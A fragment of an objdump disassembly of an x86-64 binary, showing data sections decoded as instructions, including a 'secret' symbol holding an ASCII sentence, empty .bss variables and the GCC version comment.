  201049:	0a 0b                	or     (%rbx),%cl
  20104b:	0c 0d                	or     $0xd,%al
  20104d:	0e                   	(bad)  
  20104e:	0f 10 00             	movups (%rax),%xmm0
	...

00000000002010e0 <secret>:
  2010e0:	54                   	push   %rsp
  2010e1:	68 65 20 4d 61       	pushq  $0x614d2065
  2010e6:	67 69 63 20 57 6f 72 	imul   $0x64726f57,0x20(%ebx),%esp
  2010ed:	64 
  2010ee:	73 20                	jae    201110 <__TMC_END__>
  2010f0:	61                   	(bad)  
  2010f1:	72 65                	jb     201158 <array+0x18>
  2010f3:	20 53 71             	and    %dl,0x71(%rbx)
  2010f6:	75 65                	jne    20115d <array+0x1d>
  2010f8:	61                   	(bad)  
  2010f9:	6d                   	insl   (%dx),%es:(%rdi)
  2010fa:	69 73 68 20 4f 73 73 	imul   $0x73734f20,0x68(%rbx),%esi
  201101:	69 66 72 61 67 65 2e 	imul   $0x2e656761,0x72(%rsi),%esp
	...

Disassembly of section .bss:

0000000000201120 <completed.7697>:
	...

0000000000201121 <temp>:
	...

0000000000201140 <array>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 55 62             	sub    %dl,0x62(%rbp)
   8:	75 6e                	jne    78 <_init-0x4e8>
   a:	74 75                	je     81 <_init-0x4df>
   c:	20 37                	and    %dh,(%rdi)
   e:	2e 34 2e             	cs xor $0x2e,%al
  11:	30 2d 31 75 62 75    	xor    %ch,0x75627531(%rip)        # 75627548 <_end+0x75326408>
  17:	6e                   	outsb  %ds:(%rsi),(%dx)
  18:	74 75                	je     8f <_init-0x4d1>
  1a:	31 7e 31             	xor    %edi,0x31(%rsi)
  1d:	38 2e                	cmp    %ch,(%rsi)
  1f:	30 34 2e             	xor    %dh,(%rsi,%rbp,1)
  22:	31 29                	xor    %ebp,(%rcx)
  24:	20 37                	and    %dh,(%rdi)
  26:	2e 34 2e             	cs xor $0x2e,%al
  29:	30 00                	xor    %al,(%rax)
